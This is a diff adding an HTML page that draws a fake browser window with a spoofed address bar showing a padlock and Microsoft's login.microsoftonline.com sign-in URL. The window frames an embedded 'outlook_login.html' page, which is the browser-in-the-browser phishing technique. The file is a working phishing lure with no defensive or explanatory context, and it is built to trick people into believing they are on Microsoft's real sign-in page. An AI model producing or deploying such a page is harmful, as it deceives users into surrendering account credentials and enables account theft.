@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<style>
+html, body {
+    max-width: 100%;
+    overflow-x: hidden;
+}
+</style>
+<body>
+<center>
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="windows_icon.ico" width="20px" id="logo">
+			<span id="logo-description">Sign into your account</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://login.microsoftonline.com</span>
+		<span id="domain-path">/common/oauth2/authorize?client_id=69d893ee3-ddf10-4b1c-832MjEtZG</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" style='align:center' src="outlook_login.html" frameBorder="0"></iframe>
+</div>
+</center>
+</body>
+<script src="script.js"></script>
+</html>
+
